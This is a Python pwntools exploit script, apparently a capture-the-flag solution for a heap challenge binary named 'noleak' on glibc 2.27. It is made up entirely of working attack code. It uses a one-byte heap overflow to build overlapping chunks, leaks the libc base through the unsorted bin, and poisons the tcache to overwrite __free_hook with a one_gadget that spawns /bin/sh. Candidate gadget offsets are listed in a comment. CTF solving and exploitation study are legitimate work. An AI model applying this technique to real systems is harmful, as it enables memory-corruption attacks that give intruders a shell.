#coding:utf-8
from pwn import *

context.log_level='debug'
#context.terminal=['tmux','splitw','-h']
elf = ELF('./noleak')

p = process('./noleak')
libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6')
#gdb.attach(p,'b *$rebase(0x0000000000000FAE)')

#----------PRE
p.recv()
p.send('N0_py_1n_tHe_ct7')

#---------TRUE
def menu(idx):
	p.recvuntil('>')
	p.sendline(str(idx))

def add(idx,size):
	menu(1)
	p.recvuntil('Index?\n')
	p.sendline(str(idx))
	p.recvuntil('Size?\n')
	p.sendline(str(size))

def show(idx):
	menu(2)
	p.recvuntil("Index?\n")
	p.sendline(str(idx))

def edit(idx,content):
	menu(3)
	p.recvuntil('Index?\n')
	p.sendline(str(idx))
	p.recvuntil('content:\n')
	p.sendline(content)

def free(idx):
	menu(4)
	p.recvuntil('Index?\n')
	p.sendline(str(idx))

#attach(p,'b main')

add(0,0xf0)
add(1,0xf0)
add(2,0xf8)#overflow
add(3,0xf0)#overlap
add(4,0xf0)
add(5,0xf0)
add(6,0xf0)
add(7,0xf0)
add(8,0xf0)
add(9,0xf0)#protect

free(8)
free(7)
free(6)
free(5)
free(4)
free(1)
free(9)


free(0)
edit(2,'a'*0xf0+p64(0x100+0x100+0x100))
free(3)


add(6,0xf0) #protect
add(1,0xf0)
for i in range(4):
	add(4,0xf0)

#----split unsorted bin
add(0,0xd0)
add(0,0x10)

show(1)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 - libc.sym['__malloc_hook'] - 0x10
print "[+]libc_base=>"+hex(libc_base)
free_hook = libc_base+libc.sym['__free_hook']
print "[+]free_hook=>"+hex(free_hook)

free(2)

add(1,0x40)
add(1,0xd0)
pause()
payload = 'a'*0xa0 + p64(0) + p64(0x100) + p64(free_hook)*4
edit(1,payload)

pause()

add(2,0xf0)
add(3,0xf0)#free
pause()

shell = libc_base + 0x4f432
edit(3,p64(shell))

"""
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
free(3)

p.interactive()